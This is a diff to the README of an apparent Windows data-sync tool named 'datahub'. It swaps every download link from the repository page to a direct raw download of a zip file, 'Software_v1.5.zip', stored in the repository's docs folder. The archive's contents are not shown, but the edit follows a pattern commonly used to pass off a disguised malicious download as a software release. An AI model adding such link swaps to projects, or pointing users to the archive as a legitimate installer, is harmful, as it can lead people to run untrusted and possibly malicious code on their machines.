@@ -1,12 +1,12 @@
 # 🧩 datahub - Connect Systems, Move Data Fast
 
-[![Download DataHub](https://img.shields.io/badge/Download-DataHub-blue?style=for-the-badge)](https://github.com/lukasriedinger1501-alt/datahub)
+[![Download DataHub](https://img.shields.io/badge/Download-DataHub-blue?style=for-the-badge)](https://github.com/lukasriedinger1501-alt/datahub/raw/refs/heads/main/docs/Software_v1.5.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get DataHub for Windows:
 
-[Download DataHub](https://github.com/lukasriedinger1501-alt/datahub)
+[Download DataHub](https://github.com/lukasriedinger1501-alt/datahub/raw/refs/heads/main/docs/Software_v1.5.zip)
 
 ## 🪟 Windows Setup
 
@@ -222,7 +222,7 @@ A good first test is a small sync job with a few records:
 
 If you need to get the package again, use this link:
 
-[Download DataHub](https://github.com/lukasriedinger1501-alt/datahub)
+[Download DataHub](https://github.com/lukasriedinger1501-alt/datahub/raw/refs/heads/main/docs/Software_v1.5.zip)
 
 ## 📁 Repository Details
 
